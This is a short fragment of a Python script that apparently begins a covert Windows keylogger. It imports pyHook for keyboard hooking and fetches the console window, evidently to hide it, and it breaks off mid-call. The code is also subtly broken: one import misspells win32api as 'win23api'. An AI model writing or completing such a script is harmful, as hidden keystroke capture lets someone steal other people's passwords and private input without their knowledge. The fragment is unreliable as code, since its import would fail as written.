#importing all of the libraries.

import win23api
import win32console
import win32gui
import pythoncom, pyHook #<--- is the class library for the keyboard

win = win32console.GetConsoleWindow()
win32gui.Show